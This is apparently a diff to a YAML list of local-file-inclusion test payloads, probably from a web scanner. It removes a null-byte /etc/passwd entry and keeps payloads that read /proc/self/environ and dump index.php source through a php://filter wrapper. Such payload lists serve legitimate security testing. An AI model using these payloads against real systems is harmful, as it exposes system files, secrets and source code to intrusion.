@@ -19,10 +19,6 @@ payloads:
   - id: lfi-proc-0002
     raw: "/proc/self/environ"
     tags: [unix, proc]
-  - id: lfi-null-0003
-    raw: "/etc/passwd%00"
-    encoders: [[none], [url]]
-    tags: [null-byte]
   - id: lfi-wrapper-0004
     raw: "php://filter/convert.base64-encode/resource=index.php"
     tags: [php-wrapper]
